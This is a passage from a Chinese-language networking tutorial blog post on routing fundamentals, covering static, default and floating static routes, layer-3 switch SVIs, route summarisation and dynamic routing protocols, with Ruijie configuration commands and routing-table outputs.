+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104207.png" alt="10" loading="lazy"></p>
+<h3 id="路由表的内容"><a href="#路由表的内容" class="headerlink" title="路由表的内容"></a>路由表的内容</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104210.png" alt="11" loading="lazy"></p>
+<h3 id="管理距离"><a href="#管理距离" class="headerlink" title="管理距离"></a>管理距离</h3><ul>
+<li>管理距离（Administrative Distance），也叫优先级，用来衡量路由源的可信度 </li>
+<li>管理距离值越低，可信度越高。只有可信度最高的路由会被添加进路由表</li>
+<li>管理距离默认值由厂商自定义</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104214.png" alt="12" loading="lazy"></p>
+<h3 id="路由加表原则"><a href="#路由加表原则" class="headerlink" title="路由加表原则"></a>路由加表原则</h3><p>只有最佳路径才会被添加进路由表中，形成路由条目</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104217.png" alt="13" loading="lazy"></p>
+<h3 id="路由选路原则-——-最长子网掩码匹配原则"><a href="#路由选路原则-——-最长子网掩码匹配原则" class="headerlink" title="路由选路原则 —— 最长子网掩码匹配原则"></a>路由选路原则 —— 最长子网掩码匹配原则</h3><ul>
+<li><p>路由设备基于数据包的目的IP地址，按照最长子网掩码匹配原则查找路由表 </p>
+</li>
+<li><p>根据查询结果转发。查询无果则丢弃数据包</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104223.png" alt="14" loading="lazy"></p>
+</li>
+</ul>
+<h2 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h2><h3 id="静态路由-1"><a href="#静态路由-1" class="headerlink" title="静态路由"></a>静态路由</h3><ul>
+<li>由网络管理员手工配置的路由信息，当网络拓扑发生变化时，管理员需要手工修改静态路由信息 </li>
+<li>静态路由信息是本地有效的，不会传递给其他的路由器 </li>
+<li>静态路由一般适用于比较简单的网络环境，大型和复杂的网络环境通常不宜采用静态路由 使用静态路由好处是网络安全保密性高 </li>
+<li>使用全局配置命令ip route，配置静态路由 <ul>
+<li>下一跳地址必须是直连网络上可达的地址 </li>
+<li>点对点连接时，下一跳地址可用出接口代替</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104229.png" alt="15" loading="lazy"></p>
+<h3 id="静态路由配置案例1-——-基础配置"><a href="#静态路由配置案例1-——-基础配置" class="headerlink" title="静态路由配置案例1 —— 基础配置"></a>静态路由配置案例1 —— 基础配置</h3><ul>
+<li>在3台路由器上配置静态路由，使Net 1与Net 2能互相通信 <ul>
+<li>选择100M链路，路径为：Net1-R1-R2-R3-Net2</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.2
+R2(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.1
+R2(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.6
+R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.5</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104233.png" alt="16" loading="lazy"></p>
+<h3 id="静态路由配置案例1-——-查看静态路由"><a href="#静态路由配置案例1-——-查看静态路由" class="headerlink" title="静态路由配置案例1 —— 查看静态路由"></a>静态路由配置案例1 —— 查看静态路由</h3><ul>
+<li>在特权用户模式显示IP路由表<ul>
+<li>ruijie#show ip route</li>
+</ul>
+</li>
+<li>查看R1、R2和R3的路由表</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1 
+S 192.168.2.0&#x2F;24 [1&#x2F;0] via 172.16.1.2</code></pre>
+
+<pre class="language-none"><code class="language-none">R2#show ip route
+C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2 
+C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+S 192.168.1.0&#x2F;24 [1&#x2F;0] via 172.16.1.1
+S 192.168.2.0&#x2F;24 [1&#x2F;0] via 172.16.1.6</code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.1.0&#x2F;24 [1&#x2F;0] via 172.16.1.5</code></pre>
+
+
+
+<h3 id="静态路由配置案例2-——-默认路由"><a href="#静态路由配置案例2-——-默认路由" class="headerlink" title="静态路由配置案例2 —— 默认路由"></a>静态路由配置案例2 —— 默认路由</h3><ul>
+<li>默认静态路由是特殊的静态路由，它的目标网络和子网掩码均为0.0.0.0（默认路由有可能是动态路由）</li>
+<li>在R1和R3上配置默认路由，使R1与R3的100M链路故障时，可以使用10M链路</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1(config)#ip route 0.0.0.0 0.0.0.0 172.16.1.10
+R3(config)#ip route 0.0.0.0 0.0.0.0 172.16.1.9</code></pre>
+
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5 
+C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S* 0.0.0.0&#x2F;0 [1&#x2F;0] via 172.16.1.10</code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1 
+S* 0.0.0.0&#x2F;0 [1&#x2F;0] via 172.16.1.9</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104239.png" alt="17" loading="lazy"></p>
+<h3 id="静态路由配置案例3-——-浮动静态路由"><a href="#静态路由配置案例3-——-浮动静态路由" class="headerlink" title="静态路由配置案例3 —— 浮动静态路由"></a>静态路由配置案例3 —— 浮动静态路由</h3><ul>
+<li>浮动路由就是在静态路由的基础上，加上管理距离参数，管理距离越小，可信度越高 </li>
+<li>配置了多条浮动路由，只有可信度最高（管理距离最小）的一条浮动路由会被添加到路由表中</li>
+<li>当可信度最高的浮动路由失效后，可信度次高的浮动会被添加到路由表中</li>
+<li>在R1和R3上配置浮动路由，使得正常状态路径为：Net1-R1-R2-R3-Net2 </li>
+<li>断开R1与R2、R3与R2的连接后，路径切换为：Net1-R1-R3-Net2</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.2 10
+R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.10 100
+R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.5 10
+R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.9 100</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104243.png" alt="18" loading="lazy"></p>
+<h3 id="静态路由配置案例3-——-查看浮动静态路由"><a href="#静态路由配置案例3-——-查看浮动静态路由" class="headerlink" title="静态路由配置案例3 —— 查看浮动静态路由"></a>静态路由配置案例3 —— 查看浮动静态路由</h3><ul>
+<li>配置完成后查看R1和R3的路由表</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2 
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.2.0 &#x2F;24 [10&#x2F;0] via 172.16.1.2 </code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5 
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.1.0 &#x2F;24 [10&#x2F;0] via 172.16.1.5 </code></pre>
+
+<ul>
+<li>断开R1与R2、R3与R2的连接后，查看R1和R3的路由表</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.2.0 &#x2F;24 [100&#x2F;0] via 172.16.1.10 </code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.1.0 &#x2F;24 [100&#x2F;0] via 172.16.1.9</code></pre>
+
+<h3 id="静态路由配置案例4-——-三层交换机上配置静态路由"><a href="#静态路由配置案例4-——-三层交换机上配置静态路由" class="headerlink" title="静态路由配置案例4 —— 三层交换机上配置静态路由"></a>静态路由配置案例4 —— 三层交换机上配置静态路由</h3><ul>
+<li>三层交换机也有路由功能，可实现不同VLAN间通信 </li>
+<li>在两个三层交换机上的SVI(switch virtual interface)口配置IP作为三层接口</li>
+<li>三层交换机之间的互联：（方案1）可以选择用trunk （方案2）也可以选择用三层路由接口</li>
+<li>在两台三层交换机上配置静态路由</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104249.png" alt="19" loading="lazy"></p>
+<ul>
+<li>SW1、SW2的SVI与静态路由配置 <ul>
+<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口</li>
+<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关 </li>
+<li>（方案1）VLAN 800的SVI地址可以作为SW1与SW2直连通信的路由地址 </li>
+<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">SW1(config)#vlan 800
+SW1(config)#interface vlan 10
+SW1(config-if)#ip address 192.168.1.254 255.255.255.0
+SW1(config)#interface vlan 20
+SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
+SW1(config)#interface vlan 800
+SW1(config-if)#ip address 10.0.0.1 255.255.255.252
+SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
+SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
+
+<pre class="language-none"><code class="language-none">SW2(config)#vlan 800
+SW2(config)#interface vlan 30
+SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
+SW2(config)#interface vlan 40
+SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
+SW2(config)#interface vlan 800
+SW2(config-if)#ip address 10.0.0.2 255.255.255.252
+SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
+SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
+
+<ul>
+<li>SW1、SW2的SVI与静态路由配置 <ul>
+<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口 </li>
+<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关</li>
+<li>（方案2）SW1与SW2的G0&#x2F;5接口可以转化为三层路由接口，作为互联地址 </li>
+<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">SW1(config)#interface vlan 10
+SW1(config-if)#ip address 192.168.1.254 255.255.255.0
+SW1(config)#interface vlan 20
+SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
+SW1(config)#interface GigabitEthernet 0&#x2F;5
+SW1(config-if)#no switchport
+SW1(config-if)# ip address 10.0.0.1 255.255.255.252
+SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
+SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
+
+<pre class="language-none"><code class="language-none">SW2(config)#interface vlan 30
+SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
+SW2(config)#interface vlan 40
+SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
+SW2(config)#interface GigabitEthernet 0&#x2F;5
+SW2(config-if)#no switchport
+SW2(config-if)# ip address 10.0.0.2 255.255.255.252
+SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
+SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
+
+<h3 id="静态路由配置案例4-——-三层交换机上配置静态路由-1"><a href="#静态路由配置案例4-——-三层交换机上配置静态路由-1" class="headerlink" title="静态路由配置案例4 —— 三层交换机上配置静态路由"></a>静态路由配置案例4 —— 三层交换机上配置静态路由</h3><ul>
+<li>SW1、SW2的SVI与静态路由配置 <ul>
+<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口 </li>
+<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关 </li>
+<li>（方案2）SW1与SW2的G0&#x2F;5接口可以转化为三层路由接口，作为互联地址 </li>
+<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">SW1(config)#interface vlan 10
+SW1(config-if)#ip address 192.168.1.254 255.255.255.0
+SW1(config)#interface vlan 20
+SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
+SW1(config)#interface GigabitEthernet 0&#x2F;5
+SW1(config-if)#no switchport
+SW1(config-if)# ip address 10.0.0.1 255.255.255.252
+SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
+SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
+
+<pre class="language-none"><code class="language-none">SW2(config)#interface vlan 30
+SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
+SW2(config)#interface vlan 40
+SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
+SW2(config)#interface GigabitEthernet 0&#x2F;5
+SW2(config-if)#no switchport
+SW2(config-if)# ip address 10.0.0.2 255.255.255.252
+SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
+SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
+
+<h3 id="静态路由配置案例5-——-汇总路由"><a href="#静态路由配置案例5-——-汇总路由" class="headerlink" title="静态路由配置案例5 —— 汇总路由"></a>静态路由配置案例5 —— 汇总路由</h3><ul>
+<li>路由汇总的定义：把多条路由条目汇总成一条路由条目。</li>
+<li>路由汇总的作用：收缩路由表，减轻路由器的负担，提高路由器的转发效率 </li>
+<li>分别在R1和R2上仅配置一条静态路由（不能使用默认路由），使所有PC能互相通信</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104258.png" alt="20" loading="lazy"></p>
+<ul>
+<li>配置R1路由器</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104303.png" alt="21" loading="lazy"></p>
+<h4 id="静态路由配置案例5-——-路由汇总的限制"><a href="#静态路由配置案例5-——-路由汇总的限制" class="headerlink" title="静态路由配置案例5 —— 路由汇总的限制"></a>静态路由配置案例5 —— 路由汇总的限制</h4><ul>
+<li>在特定场景下，才可实施路由汇总</li>
+<li>在以下的场景中，在R2上不能做路由汇总</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104308.png" alt="22" loading="lazy"></p>
+<h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><h3 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h3><ul>
+<li>目前网络项目中的主流路由协议有：RIP、OSPF、BGP</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104312.png" alt="23" loading="lazy"></p>
+<ul>
+<li>这是路由器用来计算、维护网络路由信息的协议，通常有一定的算法，工作在传输层或应用层 <ul>
+<li>RIP基于UDP，端口号520 </li>
+<li>OSPF基于IP，协议号89 </li>
+<li>BGP基于TCP，端口号179</li>
+</ul>
+</li>
+<li>路由协议工作机制的四个主要步骤： <ul>
+<li>邻居发现：路由器通过发送广播或组播报文的方式发现网络中的邻居，并基于特定参数来建立邻居关系。 </li>
+<li>路由交换：每台路由器将自己已知的路由相关信息发给相邻路由器。 </li>
+<li>路由计算：每台路由器运行某种算法，计算出最终的路由表。</li>
+<li>路由维护：路由器之间通过周期性地发送协议报文来维护邻居信息。</li>
+</ul>
+</li>
+</ul>
+<h3 id="动态路由基本概念"><a href="#动态路由基本概念" class="headerlink" title="动态路由基本概念"></a>动态路由基本概念</h3><ul>
+<li>衡量路由协议的主要指标 <ul>
+<li>协议计算的正确性：协议使用的算法能够计算出最优的路由，且正确无自环。 </li>
+<li>路由收敛速度：当网络的拓扑结构发生变化之后，能够迅速感知并及时更新相应的路由信息。 </li>
+<li>协议占用系统开销：协议自身占用的资源开销（内存、CPU、网络带宽)。</li>
+<li>协议自身的安全性：协议自身不易受攻击，有安全机制。 </li>
+<li>协议适用网络规模：协议可以应用在何种拓扑结构和规模的网络中。</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104316.png" alt="24" loading="lazy"></p>
+<h3 id="动态路由协议的分类"><a href="#动态路由协议的分类" class="headerlink" title="动态路由协议的分类"></a>动态路由协议的分类</h3><ul>
+<li>按照管理范围分类 <ul>
+<li>IGP（内部网关协议）：RIP、EIGRP、OSPF、IS-IS（园区网常用协议） </li>
+<li>EGP（外部网关协议）：BGP（主要应用在金融，政府电子政务网，运营商网络）</li>
+</ul>
+</li>
+<li>按照算法分类 <ul>
+<li>距离矢量路由协议：RIP、BGP </li>
+<li>链路状态路由协议：OSPF、IS-IS</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104320.png" alt="25" loading="lazy"></p>
+<h3 id="距离矢量路由协议"><a href="#距离矢量路由协议" class="headerlink" title="距离矢量路由协议"></a>距离矢量路由协议</h3><ul>
+<li>路由以矢量（距离、方向）的方式通告出去</li>
+<li>距离矢量协议直接传送各自的路由表信息 <ul>
+<li>每台路由器从邻居路由器直接获取路由信息，并将这些路由信息连同自己的本地路由信息发送给其他邻居</li>
+<li>如此逐跳传递，达到全网同步。每个路由器都不了解整个网络拓扑 </li>
+<li>它们只知道与自己直接相连的网络情况，并根据从邻居得到的路由信息更新自己的路由</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104350.png" alt="26" loading="lazy"></p>
+<h3 id="链路状态路由协议"><a href="#链路状态路由协议" class="headerlink" title="链路状态路由协议"></a>链路状态路由协议</h3><ul>
+<li>基于Dijkstra（迪克斯特拉）算法的最短路径优先（SPF）算法，比距离矢量路由协议复杂 </li>
+<li>路由器并不向邻居直接传递“路由表项”，而是通告给邻居链路状态 </li>
+<li>链路状态信息包括：接口IP地址和掩码、网络类型、链路开销、链路上所有相邻路由器</li>
+<li>运行该路由协议的路由器不是简单地从相邻的路由器学习路由，而是把路由器分成区域，收集区域的所有 的路由器的链路状态信息，根据状态信息和SPF算法生成网络拓扑结构，每一个路由器再根据拓扑结构计 算出路由</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104354.png" alt="27" loading="lazy"></p>
 ]]></content>
       <categories>
         <category>学习</category>
